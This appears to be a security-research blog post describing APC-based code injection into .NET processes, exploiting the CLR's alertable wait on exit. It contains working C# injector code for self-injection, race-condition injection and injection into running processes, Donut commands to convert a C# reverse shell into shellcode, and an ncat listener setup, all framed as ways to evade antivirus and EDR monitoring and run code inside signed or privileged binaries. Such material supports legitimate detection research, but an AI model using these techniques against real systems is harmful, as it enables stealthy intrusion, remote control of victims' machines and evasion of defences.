# Stealthy Code Injection in a Running .NET Process

# Prologue

For the past few months, I gained interest in understanding more on the Portable Executable(PE) format and Process Injection. [Among the many Process Injection techniques available](https://www.elastic.co/blog/ten-process-injection-techniques-technical-survey-common-and-trending-process), I was intrigued by `APC INJECTION`.

# Asynchronous Process Calls (APC)

>Malware can take advantage of Asynchronous Procedure Calls (APC) to force another thread to execute their custom code by attaching it to the APC Queue of the target thread. Each thread has a queue of APCs which are waiting for execution upon the target thread entering alertable state. A thread enters an alertable state if it calls SleepEx, SignalObjectAndWait, MsgWaitForMultipleObjectsEx, WaitForMultipleObjectsEx, or WaitForSingleObjectEx functions. The malware usually looks for any thread that is in an alertable state, and then calls OpenThread and QueueUserAPC to queue an APC to a thread.

The above, taken from `Ashkan Hosseini's` writeup (see credits below), gives a very good overview of APCs and how malwares could possible use them for `Process Injection`.

Basically, 

* Every thread has a queue. 
* You can put a function in this queue. 
* This queue executes asynchronously, meaning when the thread is free and in an alertable state, the function in this queue gets ran FIFO
* For a thread to be in an alertable state, the thread needs to execute one of the following functions
  * [SleepEx](https://docs.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-sleepex) 
  * [SignalObjectAndWait](https://docs.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-signalobjectandwait)
  * [WaitForSingleObjectEx](https://docs.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobjectex)
  * [WaitForMultipleObjectsEx](https://docs.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitformultipleobjectsex)
  * [MsgWaitForMultipleObjectsEx](https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-msgwaitformultipleobjectsex)
  * [NtTestAlert - Undocumented function, credits to ired.team](https://www.ired.team/offensive-security/code-injection-process-injection/shellcode-execution-in-a-local-process-with-queueuserapc-and-nttestalert)

![image](https://user-images.githubusercontent.com/12537739/126791457-bd664d47-aaa3-4611-a551-79b5d7a38829.png)

![image](https://user-images.githubusercontent.com/12537739/126791418-4e349941-580a-4862-bffb-9dd4eb4134e0.png)

# So where are we going with this?

The core of this injection technique is the function [QueueUserAPC](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-queueuserapc). 

`QueueUserApc` adds the shellcode as an asynchronous function which will be called when the thread becomes alertable.
![image](https://user-images.githubusercontent.com/12537739/126792192-6b6e7568-54d1-48ce-8458-d2f754f525de.png)


One might think that an Antivirus or an EDR could simply hook into this function and flag whoever uses it. However, this is a frequently used function for `Asynchronous Programming`. So the security solutions might monitor a chain of call from `QueueUserApc` into `ResumeThread` or some other functions like `CreateThread`, `CreateRemoteThread` API calls which are more popular and hence usually more scrutinized by AV/EDR vendors.

What if there exists a way, in the realm of .Net Applications, where the thread is set to alertable *always*, not by us, but by the `Common Language Runtime(CLR)`?

# CLR is Our Friend

When we compile a .Net code, it is compiled into Microsoft Intermediate Language (MSIL) code. This is in the format of a `.exe` or a `.dll`. However these PE files do not contain the machine instructions. A common term for them is `Managed Code`. They are machine independant. As long as you have the right .Net Framework installed, you are good to go.

The  `CLR Loader` loads this `Managed Code` and sends the instructions into the `Just-in-time` compiler which converts the MSIL code at runtime to machine code which is executed by the CPU.

![image](https://user-images.githubusercontent.com/12537739/126520609-c92dfc27-9af6-4604-878e-e471db60e785.png)

Interestingly enough, The image above shows that the CLR ultimately handles the threading support as well. `Threads` in .NET are handled by the CLR for you and it might call one of the alertable methods listed above.

A statement in C# such as,

```cs
Thread.Sleep(1000);
```
will eventually be compiled by the JIT and call one of the alertable methods, `SleepEX(..)`.

The thread is now lying dormant, sleeping. Unless, its APC queue has some function that it needs to execute.

The interesting part is, we don't even need our target executable to be calling `Thread.Sleep`. 

This amazing [article and research by Dwight Hohnstein](https://posts.specterops.io/the-curious-case-of-queueuserapc-3f62e966d2cb), shows that

>Due to the nature of the .NET compiled language runtime, user asynchronous procedure calls (APCs) are processed upon the exit of any .NET assembly without manually triggering an alertable state from managed code.

It shows that the CLR always calls `WaitForMultipleObjectsEx` when ever the program exits!

# What this means for us?

This means that ALL .NET executables, even if they do not have any alertable calls, are loaded by the CLR and upon exit of the .Net executable, the CLR will call an alertable method.

This means we can easily inject our shellcode in the form of MSIL code, into .net executables, without overly using the suspicious chain of API calls, and eventually, when the target program exits, the thread would be set to an alertable state as the CLR calls `WaitForMultipleObjectsEx`, and our shellcode executes.


This inspired me to write a POC to see for myself if it really works.

I am going to omit some code in these examples, so as to make it shorter.

The full source code is in the [repository](https://github.com/wireless90/ProcessInjector.NET/tree/main/ProcessInjector/DotNetQueueUserAPCInjectionOnExit).


# Let's first create our ShellCode

The shellcode is going to be a simple reverse shell written in C#. Its a reverse shell that connects to port `3333`

Code can be found [here](https://github.com/wireless90/ProcessInjector.NET/tree/main/ProcessInjector/ShellCode);

I then used [Donut](https://github.com/TheWover/donut) to compile our MSIL binary into a shellcode.

```sh
D:\Users\Razali\Source\Repos\donut>donut.exe -a2 -f2 -cShellCode.Program -mMain -o "myshellcode.txt" "D:\Users\Razali\Source\Repos\ProcessInjector.NET\ProcessInjector\ShellCode\bin\Release\shellcode.exe"

  [ Donut shellcode generator v0.9.3
  [ Copyright (c) 2019 TheWover, Odzhan

  [ Instance type : Embedded
  [ Module file   : "D:\Users\Razali\Source\Repos\ProcessInjector.NET\ProcessInjector\ShellCode\bin\Release\shellcode.exe"
  [ Entropy       : Random names + Encryption
  [ File type     : .NET EXE
  [ Target CPU    : amd64
  [ AMSI/WDLP     : continue
  [ Shellcode     : "myshellcode.txt"
```

`-a2` specifies to compile the shellcode to `amd64`

`-f2` specifies to encode it to `base64`

`-c` specifies the `<namespace>.<class name>`

`-m` specifies the `Method name`

`-o` specifies the `output filename`

# Lets next set up our listener

I will be using netcat for all examples below, to listen for a connection and interact with the shell.

```sh
C:\Users\Razali\Desktop\ncat-portable-5.59BETA1>ncat -l 3333

```

# Self Injection

This example demonstrates that after injecting the shellcode within the calling process, when the process exits, the shellcode gets called. At no part of the code did we put any alertable calls. 

```cs
static void SelfInject(byte[] shellcode)
{
	IntPtr allocatedSpacePtr = VirtualAlloc(0, shellcode.Length, 0x00001000, 0x40);
	Marshal.Copy(shellcode, 0, allocatedSpacePtr, shellcode.Length);
	QueueUserAPC(allocatedSpacePtr, GetCurrentThread(), 0);
	Console.WriteLine("Goodbye");
}
```

Henceforth, it confirms that when a .NET process exits, the CLR did call an alertable method on behalf of me, which invokes the shellcode, and we get a shell.

![image](https://user-images.githubusercontent.com/12537739/126809811-c4b89f79-7cb1-4a37-9c00-576622a37391.png)


# Injection using Race Condition

As stated in the documentattion of [QueueUserAPC](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-queueuserapc), if we queue an APC before the main thread starts, the main thread would first prioritize running all the APC(s) in the queue before running the main code.

While experimenting, I found that a `Console Application` is sometimes too quick to perform a race condition on, as the CLR seems to load and start the main thread even before I finish writing my APC into the queue. 

Thus, I tried injecting the APC into a `Windows Form`, which takes a longer time for the UI Thread to be set up by the CLR, allowing me to quickly inject my APC before it begins. What we expect to observe is to achieve a shell without even exiting the .NET process, as the shell is achieved even before the UI Thread(main thread) starts. Since the shell is being run by the UI Thread, we won't see the `Windows Form` as the UI Thread is busy with my shell.



```cs
static void InjectRunningProcessUsingRaceCondition(byte[] shellcode, string victimProcessPath)
{
	STARTUPINFO startupinfo = new STARTUPINFO();
	PROCESS_INFORMATION processInformation = new PROCESS_INFORMATION();
			
	CreateProcess(null, victimProcessPath, 0, 0, false, 0, 0, null, ref startupinfo, ref processInformation);

	IntPtr allocatedSpacePtr = VirtualAllocEx(processInformation.hProcess, IntPtr.Zero, shellcode.Length, 0x00001000, 0x40);
	IntPtr bytesWritten = IntPtr.Zero;
			
	WriteProcessMemory(processInformation.hProcess, allocatedSpacePtr, shellcode, shellcode.Length, out bytesWritten);

	Process process = Process.GetProcessById(processInformation.dwProcessId);
	foreach (ProcessThread thread in process.Threads)
	{
		IntPtr threadHandle = OpenThread(0x0010, false, thread.Id);
		VirtualProtectEx(processInformation.hProcess, allocatedSpacePtr, shellcode.Length, 0x20, out _);
		QueueUserAPC(allocatedSpacePtr, threadHandle, 0);
	}
}
```

Henceforth, it confirms that it is possible to race against the Main thread, and inject our APC before it starts, which results in the Main thread executing our APC before the actual code.

![image](https://user-images.githubusercontent.com/12537739/126812066-6195dbd6-e17a-4617-bbb2-8b3fd0e7c147.png)

# Injecting into any Running .NET Process

As confirmed in our first example, our APC would get executed after the program exits.

I simulated it by simply letting my `Windows Form` boot up first, giving it a headstart by pausing using `Thread.Sleep` in my injector code, after which I perform the injection.

```cs
static void InjectRunningProcess(byte[] shellcode, string victimProcessPath)
{
	STARTUPINFO startupinfo = new STARTUPINFO();
	PROCESS_INFORMATION processInformation = new PROCESS_INFORMATION();

	CreateProcess(null, victimProcessPath, 0, 0, false, 0, 0, null, ref startupinfo, ref processInformation);

	//Thread sleep is used here to give the victim process time to load and run its main thread.
	//We do not want to race against it.
	Thread.Sleep(3000);

	IntPtr allocatedSpacePtr = VirtualAllocEx(processInformation.hProcess, IntPtr.Zero, shellcode.Length, 0x00001000, 0x40);
	IntPtr bytesWritten = IntPtr.Zero;

	WriteProcessMemory(processInformation.hProcess, allocatedSpacePtr, shellcode, shellcode.Length, out bytesWritten);
	Process process = Process.GetProcessById(processInformation.dwProcessId);
	foreach (ProcessThread thread in process.Threads)
	{
		IntPtr threadHandle = OpenThread(0x0010, false, thread.Id);
		VirtualProtectEx(processInformation.hProcess, allocatedSpacePtr, shellcode.Length, 0x20, out _);
		QueueUserAPC(allocatedSpacePtr, threadHandle, 0);
	}
}
```
As expected, the moment I close the application, we gain a reverse shell.

![image](https://user-images.githubusercontent.com/12537739/126814235-5418158e-9bf0-48cb-b833-85c9d42c1b3f.png)

The above image shows that the Form starts, after which the injection of the APC occurs. No connection happens as expected.

![image](https://user-images.githubusercontent.com/12537739/126851778-ba85273c-d13f-4cc0-adcf-e2d60666f498.png)

After exiting the form, we gain a reverse shell.

# Conclusion

We saw that the CLR would always make the main thread alertable, which we can leverage on using the QueueUserAPC injection method. Although we could call the alertable method ourselves, allowing the CLR to call it for us makes it more stealthy. We also saw that this could be exploited for any .NET executables.

As [Dwight Hohnstein](https://posts.specterops.io/the-curious-case-of-queueuserapc-3f62e966d2cb) concluded in his blogpost, one can then leverage on hooking into the task schedular events and injecting into one of the scheduled programs. This would allow our code to be ran in a "signed" binary, or be ran with leveraged permissions.

# Credits
* [Ten process injection techniques: A technical survey of common and trending process injection techniques by
Ashkan Hosseini](https://www.elastic.co/blog/ten-process-injection-techniques-technical-survey-common-and-trending-process)

* [The Curious Case of QueueUserAPC by Dwight Hohnstein](https://posts.specterops.io/the-curious-case-of-queueuserapc-3f62e966d2cb)

* [Shellcode Execution in a Local Process with QueueUserAPC and NtTestAlert](https://www.ired.team/offensive-security/code-injection-process-injection/shellcode-execution-in-a-local-process-with-queueuserapc-and-nttestalert)

* [Donut-PIC Code generator for .NET](https://github.com/TheWover/donut)
